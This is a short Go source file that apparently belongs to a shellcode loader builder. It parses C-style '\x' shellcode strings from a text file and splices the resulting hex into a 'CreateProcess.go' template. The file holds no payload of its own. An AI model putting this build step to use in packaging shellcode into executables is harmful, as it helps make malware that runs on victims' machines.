package parser

import (
	"bytes"
	"io/ioutil"
	"strings"
)

func ParseShellCode() string {
	data, _ := ioutil.ReadFile("shellcode.txt")
	spits := strings.Split(string(data), "\n")
	buf := bytes.Buffer{}
	for _, item := range spits {
		if !strings.HasPrefix(item, "\"") {
			continue
		}
		temp := strings.TrimRight(item, "\r")
		temp = strings.Trim(temp, "\"")
		temp = strings.ReplaceAll(temp, "\\x", "")
		if strings.HasSuffix(item, ";") {
			temp = strings.TrimRight(temp, "\";")
		}
		buf.Write([]byte(temp))
	}
	return buf.String()
}

func GetFinalCode(shellcode string) string {
	template, _ := ioutil.ReadFile("core/CreateProcess.go")
	return strings.ReplaceAll(string(template), "__SHELLCODE__", shellcode)
}
